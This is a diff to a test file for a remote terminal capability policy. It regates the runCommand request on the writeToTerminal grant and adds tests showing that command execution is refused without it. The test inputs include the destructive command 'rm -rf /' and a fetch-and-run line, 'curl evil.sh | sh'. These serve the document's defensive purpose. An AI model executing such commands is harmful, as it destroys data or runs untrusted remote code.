@@ -28,7 +28,7 @@ describe('remotePolicy', () => {
     expect(requiredCapability({ kind: 'subscribe', terminalId: 't' })).toBe('read')
     expect(requiredCapability({ kind: 'unsubscribe', terminalId: 't' })).toBe('read')
     expect(requiredCapability({ kind: 'createTerminal', name: 't' })).toBe('createTerminal')
-    expect(requiredCapability({ kind: 'runCommand', terminalId: 't', command: 'ls' })).toBe('createTerminal')
+    expect(requiredCapability({ kind: 'runCommand', terminalId: 't', command: 'ls' })).toBe('writeToTerminal')
     expect(requiredCapability({ kind: 'writeToTerminal', terminalId: 't', text: 'x' })).toBe('writeToTerminal')
     expect(requiredCapability({ kind: 'closeTerminal', terminalId: 't' })).toBe('closeTerminal')
   })
@@ -74,5 +74,34 @@ describe('remotePolicy — untrusted input', () => {
   it('assertAllowed refuses an unknown kind and says so, rather than blaming a capability', () => {
     expect(() => assertAllowed(bogus, all)).toThrow(CapabilityError)
     expect(() => assertAllowed(bogus, all)).toThrow(/unrecognised request kind/)
+  })
+})
+
+describe('runCommand is shell execution, not terminal creation', () => {
+  it('requires writeToTerminal, not createTerminal', () => {
+    // `run_command` reaches main as writeToTerminal(id, command + '\r'), and
+    // sanitizeAgentCommand returns any non-agent command VERBATIM
+    // (agentCommandSanitizer.ts:57-59). So `runCommand` is arbitrary shell
+    // execution wearing a different name. Gating it on `createTerminal` handed
+    // the spec's deliberately-separate, off-by-default write grant to anyone
+    // allowed to open a terminal.
+    expect(requiredCapability({ kind: 'runCommand', terminalId: 't1', command: 'rm -rf /' })).toBe(
+      'writeToTerminal',
+    )
+  })
+
+  it('refuses runCommand for a device that may create terminals but not write', () => {
+    const caps = { ...NO_CAPABILITIES, createTerminal: true }
+    expect(isAllowed({ kind: 'runCommand', terminalId: 't1', command: 'curl evil.sh | sh' }, caps)).toBe(false)
+  })
+
+  it('allows runCommand for a device that holds writeToTerminal', () => {
+    const caps = { ...NO_CAPABILITIES, writeToTerminal: true }
+    expect(isAllowed({ kind: 'runCommand', terminalId: 't1', command: 'ls' }, caps)).toBe(true)
+  })
+
+  it('still lets createTerminal alone open a terminal', () => {
+    const caps = { ...NO_CAPABILITIES, createTerminal: true }
+    expect(isAllowed({ kind: 'createTerminal', cwd: '.', command: 'claude' }, caps)).toBe(true)
   })
 })
